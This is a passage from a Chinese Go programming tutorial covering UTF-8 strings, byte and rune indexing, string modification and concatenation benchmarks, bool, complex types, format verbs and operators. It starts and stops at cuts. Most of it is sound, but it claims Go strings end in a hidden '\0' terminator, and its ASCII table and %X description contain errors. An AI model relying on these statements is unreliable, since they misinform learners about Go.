! 65 A 97 a 2 STX 34 “ 66 B 98 b 3 ETX 35 # 67 C 99 c 4 EOT 36 $ 68 D 100 d 5 ENQ 37 % 69 E 101 e 6 ACK 38 \u0026amp; 70 F 102 f 7 BEL 39 , 71 G 103 g 8 BS 40 ( 72 H 104 h 9 HT 41 ) 73 I 105 i 10 LF 42 * 74 J 106 j 11 VT 43 + 75 K 107 k 12 FF 44 , 76 L 108 l 13 CR 45 - 77 M 109 m 14 SO 46 . 78 N 110 n 15 SI 47 / 79 O 111 o 16 DLE 48 0 80 P 112 p 17 DCI 49 1 81 Q 113 q 18 DC2 50 2 82 R 114 r 19 DC3 51 3 83 S 115 s 20 DC4 52 4 84 T 116 t 21 NAK 53 5 85 U 117 u 22 SYN 54 6 86 V 118 v 23 TB 55 7 87 W 119 w 24 CAN 56 8 88 X 120 x 25 EM 57 9 89 Y 121 y 26 SUB 58 : 90 Z 122 z 27 ESC 59 ; 91 [ 123 { 28 FS 60 \u0026lt; 92 / 124 | 29 GS 61 = 93 ] 125 } 30 RS 62 \u0026gt; 94 ^ 126 ` 31 US 63 ? 95 _ 127 DEL 3.4 字符串类型 由多个字符所组成的一串内容，被称为字符串。一个字符串需要用双引号 \u0026quot;\u0026quot; 包裹起来！ Golang 中的字符串以 UTF-8 编码方式存储，处理字符串也是采用 UTF-8 的编码方式，每个字符串都是 Unicode 字符集。\n3.4.1 rune 类型是数值类型，与字符串类型不兼容 1 2 3 4 5 func main() { var str1 string str1 = \u0026#39;abc\u0026#39; // 报错：Cannot use \u0026#39;\u0026#39;abc\u0026#39;\u0026#39; (type rune) as type string in assignment fmt.Println(str1) } str1 = 'abc' 这行会报错！字符只能使用单引号 '' 包裹起来，使用双引号 \u0026quot;\u0026quot; 包裹的是字符串！\n3.4.2 字符串的截取是以字节为单位 使用 len() 函数获取字符串长度时，获取到的是该 UTF-8 编码字符串的字节长度。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 func main() { s := \u0026#34;我是\u0026#34; // 字符串中是两个中文汉字 fmt.Println(\u0026#34;len(c)=\u0026#34;, len(s)) fmt.Printf(\u0026#34;s[1], value=%v, char=%c\\n\u0026#34;, s[1], s[1]) fmt.Println(\u0026#34;s[:3]=\u0026#34;, s[:2]) fmt.Println(\u0026#34;s[:3]=\u0026#34;, s[:3]) } /* 运行结果： len(c)= 6 s[1], value=136, char=ˆ s[:3]= � s[:3]= 我 */ 在中文字符串中肆意乱截取，很大概率会输出乱码。 由 len(s) 可以得知，此例中字符串 s 的长度为 6，而字符串中只有 2 个汉字。因此，在 Golang 中，一个汉字占 3 个字节。一个汉字由 3 个字节编码而成，使用下标取值时，只是取到了某一个字节的值而已。\n3.4.3 对字符串的索引，只会一个 byte 值 Golang 使用 UTF-8 编码方式存储、处理字符串，最终是以 Unicode 字符集的形式来表现字符串。Unicode 字符集最终也是用整数数值的方式来呈现的。 因此，对字符串的索引操作，会返回一个 byte 值，而不是一个具体显示内容的字符。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 func main() { s := \u0026#34;我是gopher\u0026#34; for i := 0; i \u0026lt; len(s); i++ { fmt.Printf(\u0026#34;s[%d], %%d=%d, %%c=%c\\n\u0026#34;, i, s[i], s[i]) } } /* 运行结果： s[0], %d=230, %c=æ s[1], %d=136, %c=ˆ s[2], %d=145, %c=‘ s[3], %d=230, %c=æ s[4], %d=152, %c=˜ s[5], %d=175, %c=¯ s[6], %d=103, %c=g s[7], %d=111, %c=o s[8], %d=112, %c=p s[9], %d=104, %c=h s[10], %d=101, %c=e s[11], %d=114, %c=r */ 如果字符串中含有中文字符（一个中文字符在 UTF-8 编码方式下，占 3 个字节）。因为是由 3 个字节编码而成，如果按照索引来取含有 UTF-8 编码的字符，就会出现乱码。\n3.4.4 遍历中英文混合字符串的示例 UTF-8 是一种变长的编码方式，字符长度从 1 个字节到 4 个字节不等。而 byte 类型只占 1 个字节。就算你想要使用多个 byte 进行表示，但也无从知晓要处理的 UTF-8 字符究竟占了几个字节。 利用 []int32() 和 []rune() 将字符串转为 Unicode 字符集（Unicode 的数值），再进行截取。这样就无需考虑字符串中是否含有 UTF-8 字符的情况了。\n3.4.4.1 []int32() 写法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 func main() { s := \u0026#34;我是gopher\u0026#34; fmt.Println(\u0026#34;s=\u0026#34;, s) //fmt.Print()系列函数是输出内容的本身 //Golang使用UTF-8编码方式将字符串存储成Unicode字符集 //UTF-8编码方式下，一个中文占3个字节 //[:2]只是取到了前两个字节值而已，所以显示了乱码 fmt.Println(\u0026#34;s[:2]=\u0026#34;, s[:2]) fmt.Println(\u0026#34;s[1]=\u0026#34;, s[1]) //遍历取到的是字符串中的每个字符。如果是中文字符，那么依然是占3个字节，遍历的时候也是取了3个字节 for i, v := range s { //格式化打印是直接显示原本的字符内容 fmt.Printf(\u0026#34;s[%d] : unicode=%v, %%c=%c\\n\u0026#34;, i, v, v) } fmt.Println(\u0026#34;----------------------------------------\u0026#34;) //利用[]int32()将字符串存储为Unicode字符集 unicodeString := []int32(s) fmt.Println(\u0026#34;unicodeString value : \u0026#34;, unicodeString) //显示的是Unicode字符的数值 fmt.Println(\u0026#34;unicodeString[:3] : \u0026#34;, unicodeString[:3]) //遍历的是Unicode字符集切片 for i, v := range unicodeString { fmt.Printf(\u0026#34;s[%d] = %v\\n\u0026#34;, i, v) } //截取到的是Unicode切片中的前2个值 //将这2个值转换为字符串之后再输出 fmt.Println(string(unicodeString[:2])) fmt.Println(unicodeString[:2]) //不转换成字符串只会输出原本的内容。fmt.Print()系列函数是输出内容的本身 } /* 运行结果： s= 我是gopher s[:2]= � s[1]= 136 s[0] : unicode=25105, %c=我 s[3] : unicode=26159, %c=是 s[6] : unicode=103, %c=g s[7] : unicode=111, %c=o s[8] : unicode=112, %c=p s[9] : unicode=104, %c=h s[10] : unicode=101, %c=e s[11] : unicode=114, %c=r ---------------------------------------- unicodeString value : [25105 26159 103 111 112 104 101 114] unicodeString[:3] : [25105 26159 103] s[0] = 25105 s[1] = 26159 s[2] = 103 s[3] = 111 s[4] = 112 s[5] = 104 s[6] = 101 s[7] = 114 我是 [25105 26159] */ 3.4.4.2 与 []int32() 等价的 []rune() 写法 []rune() 将字符串转换为 Unicode 码点。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 func main() { s := \u0026#34;我爱 Golang！\u0026#34; //感叹号是中文的 unicodeRune := []rune(s) fmt.Println(\u0026#34;unicode value : \u0026#34;, unicodeRune) fmt.Println(\u0026#34;unicodeRune[:2], unicode value : \u0026#34;, unicodeRune[:2]) fmt.Println(\u0026#34;string(unicodeRune[:2]) = \u0026#34;, string(unicodeRune[:2])) fmt.Println(\u0026#34;string(unicodeRune) : \u0026#34;, string(unicodeRune)) } /* 运行结果： unicode value : [25105 29233 32 71 111 108 97 110 103 65281] unicodeRune[:2], unicode value : [25105 29233] string(unicodeRune[:2]) = 我爱 string(unicodeRune) : 我爱 Golang！ */ 与 3.4.4.1 示例中的原理一致：[]int32() 和 []rune() 都是将字符串转换成 Unicode 字符数值。无论是截取还是直接打印，得到的都将是 Unicode 数值。若想要看到正常的文字内容，需要将 Unicode 数值转换为字符串后再打印。 注：Unicode 和 ASCII 一样，都是一种字符集，UTF-8 是一种编码格式。\n3.4.4.3 range 遍历字符串 range 遍历字符串，得到的是 rune 类型的字符。\n3.4.4.3.1 获取下标的时候，得到的是 uint8 类型 使用 range 遍历字符串，通过下标去取字符串中的值，得到的是单个字符，字符的本质类型则是 uint8。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 func main() { s := \u0026#34;我是gopher\u0026#34; for i := range s { fmt.Printf(\u0026#34;current i=%d, %%d=%[2]d, %%c=%[2]c, %%T=%[2]T\\n\u0026#34;, i, s[i]) } fmt.Println(\u0026#34;-------- 以下示例为了区别 range 遍历 --------\u0026#34;) for i := 0; i \u0026lt; len(s); i++ { fmt.Printf(\u0026#34;current i=%d, %%d=%[2]d, %%c=%[2]c, %%T=%[2]T\\n\u0026#34;, i, s[i]) } } /* 运行结果： current i=0, %d=230, %c=æ, %T=uint8 current i=3, %d=230, %c=æ, %T=uint8 current i=6, %d=103, %c=g, %T=uint8 current i=7, %d=111, %c=o, %T=uint8 current i=8, %d=112, %c=p, %T=uint8 current i=9, %d=104, %c=h, %T=uint8 current i=10, %d=101, %c=e, %T=uint8 current i=11, %d=114, %c=r, %T=uint8 -------- 以下示例为了区别 range 遍历 -------- current i=0, %d=230, %c=æ, %T=uint8 current i=1, %d=136, %c=ˆ, %T=uint8 current i=2, %d=145, %c=‘, %T=uint8 current i=3, %d=230, %c=æ, %T=uint8 current i=4, %d=152, %c=˜, %T=uint8 current i=5, %d=175, %c=¯, %T=uint8 current i=6, %d=103, %c=g, %T=uint8 current i=7, %d=111, %c=o, %T=uint8 current i=8, %d=112, %c=p, %T=uint8 current i=9, %d=104, %c=h, %T=uint8 current i=10, %d=101, %c=e, %T=uint8 current i=11, %d=114, %c=r, %T=uint8 */ 两段代码有一点区别：for i := range s 只出现了 2 个乱码，而 for i := 0; i \u0026lt; len(s); i++ 出现了 6 个乱码。 原因： Golang 中，字符串是以 UTF-8 编码格式存放的 Unicode 字符码点，一个中文占 3 个编码字节。 for i := range s 的时候，虽然是以 []rune 类型在遍历。但遇到了通过下标去获取字符串中的内容（相当于指定去取字符串中，某个下标值中的内容），只能取到对应下标中的字节码值。第一次，i 是初始值 0；第二次，i 的值则变成了 3。所以，只是对应地去取了这 2 个下标中的内容。 而 for i := 0; i \u0026lt; len(s); i++ 的时候，就不再是遍历 []rune 类型了，是逐个逐个地遍历每一个字节，把字符串中的每个字节都遍历到了。\n3.4.4.3.2 获取值的时候，得到的是 int32 类型 使用 range 遍历字符串的时候，值的部分是 int32 类型。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 func main() { s := \u0026#34;我是gopher\u0026#34; for i, c := range s { fmt.Printf(\u0026#34;current i=%d, %%d=%[2]d, %%c=%[2]c, %%T=%[2]T\\n\u0026#34;, i, c) } } /* 运行结果： current i=0, %d=25105, %c=我, %T=int32 current i=3, %d=26159, %c=是, %T=int32 current i=6, %d=103, %c=g, %T=int32 current i=7, %d=111, %c=o, %T=int32 current i=8, %d=112, %c=p, %T=int32 current i=9, %d=104, %c=h, %T=int32 current i=10, %d=101, %c=e, %T=int32 current i=11, %d=114, %c=r, %T=int32 */ 使用 range 遍历字符串，分别得到下标和具体的值。因为一个中文字符在 Golang 的 UTF-8 编码下占 3 个字节，所以此例中，占用的下标就是 [0 ~ 2]、[3 ~ 5]。 rune 是 int32 的别名，因此打印类型时，就显示了 rune 它本身的数据类型。\n3.4.4.4 参考文献 https://juejin.im/post/6844903998634328078\n3.4.5 如何修改字符串中的某个元素 我想要修改字符串中的某个元素，如何操作？\n3.4.5.1 错误警示 直接对下标中的元素进行修改：\n1 2 3 4 5 func main() { str := \u0026#34;hello\u0026#34; str[0] = \u0026#39;x\u0026#39; //报错：cannot assign to str[0] fmt.Println(str) } 编译就通不过，直接报错。原因：在 Golang 中，字符串是不可变的。\n3.4.5.2 正确的操作 使用 []byte() 或 []rune()，先将一个字符串转换成字节切片类型，然后对某个下标中的元素进行修改，最后使用 string() 转换回字符串。\n3.4.5.2.1 单字符构成的字符串 如果这个字符串都是有单字符构成，那么先将这个字符串转换为 []byte 类型后，再修改某个下标中的元素，最后将这个 []byte 类型使用 string() 转换回来。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 func main() { str := \u0026#34;hello\u0026#34; b := []byte(str) //先转换成 []byte 类型 fmt.Println(b) b[0] = \u0026#39;x\u0026#39; str = string(b) //再将 []byte 类型转换回字符串类型 fmt.Println(str) } /* 运行结果： [104 101 108 108 111] xello */ 3.4.5.2.2 字符串中有复合字符 如果一个字符串有复合字符，那么就需要使用 []rune 或 []int32 来转换。转换成字节后才能修改，最后依然用 string() 转换回字符串。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 func main() { str := \u0026#34;go 你好\u0026#34; b := []rune(str) // []int32() 也可以 fmt.Println(str, \u0026#34;,\u0026#34;, b) fmt.Println(rune(\u0026#39;很\u0026#39;)) //单个字符转换，也可以直接写成：fmt.Println(\u0026#39;很\u0026#39;) b[3] = 24456 str = string(b) fmt.Println(str) } /* 运行结果： go 你好 , [103 111 32 20320 22909] 24456 go 很好 */ 3.4.6 其他类型与字符串的转换 3.4.6.1 十六进制转换为字符串 有一个字符串切片，里面的每个元素都是以字符串形式保存的十六进制值。现在要将这些十六进制值，转换为其原本的明文字符内容。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import ( \u0026#34;fmt\u0026#34; \u0026#34;strconv\u0026#34; ) func main() { original := []string{\u0026#34;30d7\u0026#34;, \u0026#34;30ed\u0026#34;, \u0026#34;30b0\u0026#34;, \u0026#34;30e9\u0026#34;, \u0026#34;30e0\u0026#34;} for _, v := range original { if s, err := strconv.ParseInt(v, 16, 32); err == nil { fmt.Printf(\u0026#34;%T\\t%d\\t%c\\n\u0026#34;, v, s, s) } else { panic(err) } } } /* 运行结果： string\t12503\tプ string\t12525\tロ string\t12464\tグ string\t12521\tラ string\t12512\tム */ 3.4.7 高性能字符串拼接的几个方式 将以下几个字符串拼接方式，都放入单独的函数中，最后使用 Go 语言自带的 Benchmark 进行简单的性能测试。 设置 1000 次拼接，因此：const Loop = 1000\n3.4.7.1 使用 strings.Builder 它使用零值、不拷贝零值、使用内存最小。 示例：\n1 2 3 4 5 6 7 func StrBuilder() { var str strings.Builder for i := 0; i \u0026lt; Loop; i++ { str.WriteString(\u0026#34;a\u0026#34;) } } 注：不要拷贝 strings.Builder 的值。\n3.4.7.2 使用 bytes.Buffer bytes 包的 Buffer 实现了 io.Writer 的接口，使用 bytes.Buffer 的 WriteString() 方法去拼接字符串，时间复杂度为 O(n)。 示例：\n1 2 3 4 5 6 7 func BytesBuffer() { var buffer bytes.Buffer for i := 0; i \u0026lt; Loop; i++ { buffer.WriteString(\u0026#34;a\u0026#34;) } } 3.4.7.3 使用内建函数 copy 示例：\n1 2 3 4 5 6 7 8 func GoCopy() { bs := make([]byte, 0, Loop) bl := 0 for i := 0; i \u0026lt; Loop; i++ { bl += copy(bs[bl:], \u0026#34;a\u0026#34;) } } 3.4.7.4 使用内建函数 append 示例：\n1 2 3 4 5 6 7 func GoAppend() { bs := make([]byte, 0, Loop) for i := 0; i \u0026lt; Loop; i++ { bs = append(bs, \u0026#39;a\u0026#39;) } } 3.4.7.5 加号拼接 使用加号 + 进行拼接。 示例：\n1 2 3 4 5 6 7 func StrPlus() { var result string for i := 0; i \u0026lt; Loop; i++ { result += \u0026#34;a\u0026#34; } } 3.4.7.6 使用 strings.Repeat 将 N 个字符串 s，连接成一个新的字符串。 示例：\n1 2 3 4 5 func StrRepeat() { for i := 0; i \u0026lt; Loop; i++ { strings.Repeat(\u0026#34;a\u0026#34;, Loop) } } 3.4.7.7 编写 Benchmark 测试代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 import \u0026#34;testing\u0026#34; func BenchmarkStrBuilder(b *testing.B) { b.ResetTimer() for i := 0; i \u0026lt; b.N; i++ { StrBuilder() } } func BenchmarkBytesBuffer(b *testing.B) { b.ResetTimer() for i := 0; i \u0026lt; b.N; i++ { BytesBuffer() } } func BenchmarkGoCopy(b *testing.B) { b.ResetTimer() for i := 0; i \u0026lt; b.N; i++ { GoCopy() } } func BenchmarkGoAppend(b *testing.B) { b.ResetTimer() for i := 0; i \u0026lt; b.N; i++ { GoAppend() } } func BenchmarkStrPlus(b *testing.B) { b.ResetTimer() for i := 0; i \u0026lt; b.N; i++ { StrPlus() } } func BenchmarkStrRepeat(b *testing.B) { b.ResetTimer() for i := 0; i \u0026lt; b.N; i++ { StrRepeat() } } 3.4.7.8 总结 在确切知道有多少内容的情况下，可以提前将 append() 和 copy() 这两个内建函数的容量值（也就是 cap ），给申请下来，避免了 cap 的重复检查、扩容。 因此，在事先知道字符串的长度时：append() 的性能最高。copy() 的开销最少。 如果无法确定字符串内容的多少，最佳的方案就是 strings.Builder 的 WriteString() 方法。\n3.4.7.9 参考文献 https://www.toutiao.com/a6736789153746256396\n3.4.8 字符串不总是 UTF-8 文本 字符串的值可以包含任何字节，只有当字符串字面量（string literal）使用时，才会是 UTF-8。 验证一个字符串是否为 UTF-8 文本，可以使用 unicode/utf8 包下的 utf8.ValidString() 方法。 示例：\n1 2 3 4 5 6 7 func main() { s1 := \u0026#34;ABC\u0026#34; fmt.Println(utf8.ValidString(s1)) // true s2 := \u0026#34;\\xAF\u0026#34; fmt.Println(utf8.ValidString(s2)) // false } 备注：来源于：https://levy.at/blog/10（字符串不总是UTF8文本）\n3.4.9 Go 字符串使用 byte 表示的原因 Go 字符串使用 byte 序列来表示，根本原因是因为各种语言的字符长度“飘忽不定”。 先看下面这段代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 func main() { s1 := \u0026#34;é\u0026#34; // 这个是葡萄牙语，中译：它的 fmt.Printf(\u0026#34;len(s1)=%d, []rune=%#v, []byte=%#v\\n\u0026#34;, len(s1), []rune(s1), []byte(s1)) // 既然在 byte 下占 3 个字节的长度，那么就可以对这个 byte 逐位修改 b_s1 := []byte(s1) b_s1[0] = \u0026#39;a\u0026#39; b_s1[1] = \u0026#39;b\u0026#39; b_s1[2] = \u0026#39;c\u0026#39; fmt.Println(string(b_s1)) } /* 运行结果： len(s1)=3, []rune=[]int32{101, 769}, []byte=[]byte{0x65, 0xcc, 0x81} abc */ 葡萄牙语的这个单词，在 []rune 中，占 2 个字节长度；而在 []byte 中，占了 3 个长度。 各国语言的字符，在不同的数据类型下（[]rune []byte），长度不一等都一样。 下面看一个中文示例：\n1 2 3 4 5 6 7 8 9 10 11 func main() { s1 := \u0026#34;中\u0026#34; fmt.Printf(\u0026#34;len(s1)=%d, []rune=%#v, []byte=%#v\\n\u0026#34;, len(s1), []rune(s1), []byte(s1)) fmt.Println(\u0026#34;[]rune(s1) =\u0026#34;, len([]rune(s1))) } /* 运行结果： len(s1)=3, []rune=[]int32{20013}, []byte=[]byte{0xe4, 0xb8, 0xad} []rune(s1) = 1 */ 字符串中只有一个元素\u0026quot;中\u0026quot;，[]rune 下，占 1 个字节长度；而在 []byte 中，依然占了 3 个长度。 因为各个语言中的字符长度“飘忽不定”，因此只能采用一种统一的策略来进行管理，以免发生混乱。\n3.5 字符和字符串的区别 1.字符只能用单引号包裹起来，字符串需要双引号包裹起来。 2.字符只能是单个字符，字符串是能多个字符所构成。 有的转义字符只是看起来是由两个字符构成。比如 \\n：肉眼看上去是 \\ 和 n 两个字符拼接在一起的，其实它是ASCII码 10 的另外一个书写形式。 示例：\n1 2 3 4 5 6 7 8 9 10 11 func main() { var ch byte ch = 10 fmt.Printf(\u0026#34;aaa%cbbb\u0026#34;, ch) } /* 运行结果： aaa bbb */ 3.字符串的结尾都隐藏了一个结束符 \\0。 在ASCII码中它的10进制值是0，它是一个空字符，是看不到的。 str1 := \u0026quot;a\u0026quot;实则上是由'a'和'\\0'组成了一个字符串。\n3.6 bool类型 Golang 中，布尔类型的值只能是预定义标识符：true 或 false。\n3.6.1 注意事项 1.布尔类型变量的零值为 false。 2.Golang 中不允许将整型强制转换为布尔型。 3.布尔类型无法参与数值运算，也无法与其他类型进行转换。\n3.6.2 用数值来表示真假的错误示例 在 Golang 中，布尔类型的值只能是 true 或 false。 一些脚本编程语言或是一些弱类型编程语言中，数值 0 或 1 、空数组、空集合等也可以用来表真或假。但在 Golang 中，这是不允许的！Golang 中，bool 值只能是 true 或 false！ 错误示例：\n1 2 3 4 5 6 7 func main() { a := 0 if a { //这行会报错：非布尔\u0026#39;a\u0026#39;(类型为int)用作条件 fmt.Println(\u0026#34;yes\u0026#34;) } } 3.7 复数类型 由实部和虚部构成。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 func main() { var t1 complex128 //声明 t1 = 3 + 5i //赋值 fmt.Println(\u0026#34;t1 = \u0026#34;, t1) t2 := 7 + 9.9i fmt.Printf(\u0026#34;t2 type is : %T\\n\u0026#34;, t2) //通过内建函数，取实部和虚部 fmt.Printf(\u0026#34;real(t2)=%v, imag(t2)=%v\\n\u0026#34;, real(t2), imag(t2)) } /* 运行结果： t1 = (3+5i) t2 type is : complex128 real(t2)=7, imag(t2)=9.9 */ 3.8 类型转换 类型转换只能转换相互兼容的类型，比如 byte 类型转换成 int 类型。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 func main() { //这种不能转换的类型，叫不兼容类型 var flag bool flag = true fmt.Printf(\u0026#34;flag = %t\\n\u0026#34;, flag) //bool类型不能转换为int // fmt.Printf(\u0026#34;flag = %d\\n\u0026#34;, int(flag)) //其他语言中0就是假，非0就是真 //整型也不能转换为bool //flag = bool var ch byte ch = \u0026#39;a\u0026#39; //字符类型本质上就是整型 var t int // t = ch //会报错 t = int(ch) //类型转换，把ch的值取出来，转换成整型 fmt.Println(\u0026#34;t = \u0026#34;, t) } /**运行结果 flag = true t = 97 **/ 3.9 类型别名 给一个数据类型起一个别名（小名），最常用的场景就是结构体 struct。 语法：type 别名 数据类型 使用：var 变量名 别名 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 func main() { //给int64这个数据类型起个别名叫bigint type bigint int64 var a bigint //a变量声明为bigint类型 fmt.Printf(\u0026#34;a type is : %T\\n\u0026#34;, a) //指向了自定义的bigint类型 //多个别名一起声明 type ( char byte long int64 ) //声明变量为自定义类型 var ch char var ll long ch = \u0026#39;a\u0026#39; ll = 123456 fmt.Printf(\u0026#34;ch=%v, ll=%v\\n\u0026#34;, ch, ll) fmt.Printf(\u0026#34;ch type is : %T, ll type is : %T\\n\u0026#34;, ch, ll) } /* 运行结果： a type is : main.bigint ch=97, ll=123456 ch type is : main.char, ll type is : main.long */ 3.10 格式化输出 格式 含义 %% 一个%字面量 %b 一个二进制整数值(基数为2)，或者是一个(高级的)用科学计数法表示的指数为2的浮点数 %c 字符型。可以把输入的数字按照ASCII码相应转换为对应的字符 %d 一个十进制数值(基数为10) %e 以科学记数法e表示的浮点数或者复数值 %E 以科学记数法E表示的浮点数或者复数值 %f 以标准记数法表示的浮点数或者复数值 %g 以%e或者%f表示的浮点数或者复数，任何一个都以最为紧凑的方式输出 %G 以%E或者%f表示的浮点数或者复数，任何一个都以最为紧凑的方式输出 %o 一个以八进制表示的数字(基数为8) %p 以十六进制(基数为16)表示的一个值的地址，前缀为0x,字母使用小写的a-f表示 %q 使用Go语法以及必须时使用转义，以双引号括起来的字符串或者字节切片[]byte，或者是以单引号括起来的数字 %s 字符串。输出字符串中的字符直至字符串中的空字符（字符串以\u0026rsquo;\\0‘结尾，这个\u0026rsquo;\\0\u0026rsquo;即空字符） %t 以true或者false输出的布尔值 %T 使用Go语法输出的值的类型 %U 一个用Unicode表示法表示的整型码点，默认值为4个数字字符 %v 使用默认格式输出的内置或者自定义类型的值，或者是使用其类型的String()方式输出的自定义值，如果该方法存在的话 %x 以十六进制表示的整型值(基数为十六)，数字a-f使用小写表示 %X 以十六进制表示的整型值(基数为十六)，数字A-F使用小写表示 %v 属于万能格式，自动匹配格式输出。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 func main() { a := 10 b := \u0026#34;abc\u0026#34; c := \u0026#39;a\u0026#39; d := 3.14 //%T操作变量所属类型 fmt.Printf(\u0026#34;%T, %T, %T, %T\\n\u0026#34;, a, b, c, d) //%d\t整型格式 //%s\t字符串格式 //%c\t字符格式 //%f\t浮点型格式 fmt.Printf(\u0026#34;a = %d, b = %s, c = %c, d = %f\\n\u0026#34;, a, b, c, d) //%v自动匹配格式输出 fmt.Printf(\u0026#34;a = %v, b = %v, c = %v, d = %v\u0026#34;, a, b, c, d) } /**运行结果 int, string, int32, float64 a = 10, b = abc, c = a, d = 3.140000 a = 10, b = abc, c = 97, d = 3.14 **/ 3.11 非十进制可选前缀 一个整数数值字面量无需带前缀，除非它是负数，或者自己想要添加一个加号。 非十进制可选前缀设置表示法： 二进制：0b 或 0B 八进制：0, 0o 或 0O 十六进制：0x 或 0X; 在十六进制中，[a ~ f] 或 [A ~ F] 代表十进制值 10 ~ 15 只有单个 0 被认为是十进制的 0。\n3.12 _ 增强数值的可读性 如果有一个特别大的数值，一眼看过去，一时半会儿看不清楚它是百亿还是千亿。那么在代码中，可以在这个数值中添加下划线 _，来增强数值的可读性。 例如：\n1 2 3 4 5 6 7 8 9 10 11 12 13 func main() { n := 123_456_789_000 fmt.Printf(\u0026#34;n type: %[1]T, value=%[1]v\\n\u0026#34;, n) n += 55_55555_55555 fmt.Printf(\u0026#34;n type: %[1]T, value=%[1]v\\n\u0026#34;, n) } /* 运行结果： n type: int, value=123456789000 n type: int, value=679012344555 */ 其实是个语法糖，_ 被当做分隔符来使用了。自己看着怎么易读，就怎么分割。同样适用于十六进制的值以及小数中！\n四、运算符 4.1 Golang内建的运算符 Golang 内建的运算符有：算术运算符、关系运算符、逻辑运算符、位运算符、赋值运算符。\n4.2 算术运算符 运算符 描述 示例 结果 + 相加 10 + 3 13 - 相减 10 - 3 7 * 相乘 10 * 3 30 / 相除 10 / 3 3 % 取余 10 % 3 1 Golang 中自增自减的注意： 在 Golang 中，++（自增）和 --（自减）是单独的语句，并不是运算符。 而且自增自减必须是单独一行（单独的语句），下例中的自增是非法的：\n1 2 i := 1 j = i++ //此处的 i++ 是非法的，i++ 必须是单独的语句 4.3 关系运算符 运算符 描述 示例 结果 == 相等于 4 == 3 false != 不等于 4 != 3 true \u0026gt; 大于 4 \u0026gt; 3 true \u0026lt; 小于 4 \u0026lt; 3 false \u0026gt;= 大于等于 4 \u0026gt;= 3 true \u0026lt;= 小于等于 4 \u0026lt;= 3 false 4.4 逻辑运算符 运算符 描述 示例 结果 \u0026amp;\u0026amp; 逻辑与, 两边都为真, 则结果为真; 其余为假 true \u0026amp;\u0026amp; true true || 逻辑或, 两边都为假, 则结果为假; 其余为真 true || false true ! 逻辑非, 条件为真, 则结果为假; 条件为假, 则结果为真 !true false 4.5 位运算符 位运算符是对整数在内存中的二进制位进行操作。用得不多\n运算符 描述 \u0026amp; 参与运算的两数各对应的二进位相与。 （两位均为1才为1） | 参与运算的两数各对应的二进位相或。 （两位有一个为1就为1） ^ 参与运算的两数各对应的二进位相异或，当两对应的二进位相异时，结果为1。 （两位不一样则为1） \u0026laquo; 左移n位就是乘以2的n次方。 “a\u0026laquo;b”是把a的各二进位全部左移b位，高位丢弃，低位补0。 \u0026raquo; 右移n位就是除以2的n次方。 “a\u0026raquo;b”是把a的各二进位全部右移b位。 示例1：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 const size = 2 \u0026lt;\u0026lt; 4 func main() { fmt.Println(\u0026#34;2 \u0026lt;\u0026lt; 10 = \u0026#34;, 2\u0026lt;\u0026lt;10) //表示：2*2**10，2乘以2的10次方 fmt.Println(\u0026#34;1024 \u0026gt;\u0026gt; 2 = \u0026#34;, 1024\u0026gt;\u0026gt;2) //表示：1024/2**2，1024除以2的2次方 fmt.Println(\u0026#34;const size = \u0026#34;, size) } /* 运算结果： 2 \u0026lt;\u0026lt; 10 = 2048 1024 \u0026gt;\u0026gt; 2 = 256 const size = 32 */ 4.6 赋值运算符 运算符 描述 = 简单的赋值运算符，将一个表达式的值赋给一个左值 += 相加后再赋值 -= 相减后再赋值 *= 相乘后再赋值 /= 相除后再赋值 %= 求余后再赋值 \u0026laquo;= 左移后赋值 \u0026raquo;= 右移后赋值 \u0026amp;= 按位与后赋值 |= 按位或后赋值 ^= 按位异或后赋值 4.7 运算符优先级 优先级：从上往下由高到低\n优先级 运算符 7 ^ ! 6 * / % \u0026lt;\u0026lt; \u0026gt;\u0026gt; \u0026amp;\u0026amp; ^ 5 + - ` 4 == != \u0026lt; \u0026lt;= \u0026gt; \u0026gt;= 3 \u0026lt;- 2 \u0026amp;\u0026amp; 1 ` 使用小括号()把一个表达式包裹起来可以提升优先级。\n4.8 Golang中，不能使用复合表达式 其他编程语言中，比较一个数即要大于某个数同时也要小于某个数（比如：当 a=7 时，判断：a 是否大于等于 0 并且 a 是否小于等于 10），那么就会用到复合布尔表达式（例如：0 \u0026lt;= a \u0026lt;= 10）。 但在 Golang 中就会报错：\n1 2 3 4 5 6 7 8 9 func main() { a := 7 fmt.Println(\u0026#34;0 \u0026lt;= a \u0026lt;= 10 的结果：\u0026#34;, 0 \u0026lt;= a \u0026lt;= 10) /* cannot convert 10 (type untyped number) to type bool invalid operation: 0 \u0026lt;= a \u0026lt;= 10 (mismatched types bool and int) 不匹配的类型bool和int */ } golang的int类型与bool类型不兼容！0 \u0026lt;= a 得出的结果是一个 bool 类型的值 true，true \u0026lt;= 10。10是一个 int 类型，true 是 bool 类型，两者的类型在 golang 中不兼容，因此报错！ 需要使用与（\u0026amp;\u0026amp;）运算符：\n1 2 3 4 5 func main() { a := 7 fmt.Println(\u0026#34;0 \u0026lt;= a \u0026lt;= 10 的结果：\u0026#34;, 0 